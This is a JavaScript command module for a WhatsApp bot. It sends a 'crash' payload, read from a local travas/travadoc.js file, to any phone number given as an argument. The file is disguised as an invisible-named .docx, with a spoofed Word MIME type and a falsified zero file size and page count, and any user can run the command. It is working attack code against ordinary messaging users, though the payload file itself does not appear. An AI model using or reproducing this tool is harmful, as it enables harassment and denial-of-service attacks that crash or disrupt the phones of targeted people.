/* * 👑 MISA CRASH-INVISIBLE-DOC
 * Ruta: comandos/travadoc.js
 */

import fs from 'fs';
import path from 'path';

const crashDocMisa = {
    name: 'travadoc',
    alias: ['tdoc', 'doc', 'invisible'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        try {
            const chat = m.key.remoteJid;

            if (!args[0]) {
                return await conn.sendMessage(chat, { 
                    text: `✧ ‧₊˚ *MISA INVISIBLE DOC* ୧ֹ˖\n\n✰ \`Uso\`: ${command} [número]` 
                }, { quoted: m });
            }

            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            // Ruta al archivo travadoc.js en tu carpeta travas
            const pathTrava = path.join(process.cwd(), 'travas', 'travadoc.js');
            
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré `travas/travadoc.js`.' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava);

            await conn.sendMessage(chat, { react: { text: '👻', key: m.key } });

            // Caracter invisible (Zero Width Non-Joiner) + extensión .docx
            const nombreInvisible = '\u200C' + '.docx';

            // ENVÍO DEL DOCUMENTO FANTASMA
            await conn.sendMessage(targetJid, {
                document: contenidoTrava,
                fileName: nombreInvisible, 
                mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                fileLength: 0, // Engañamos al sistema para que marque 0 KB
                pageCount: 0,
                caption: '' // Sin texto para que se vea más sospechoso y limpio
            });

            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
            await conn.sendMessage(chat, { 
                text: `✅ *Archivo invisible enviado a @${num}*`,
                mentions: [targetJid]
            }, { quoted: m });

        } catch (err) {
            console.error('[ERROR INVISIBLE DOC]:', err);
        }
    }
};

export default crashDocMisa;
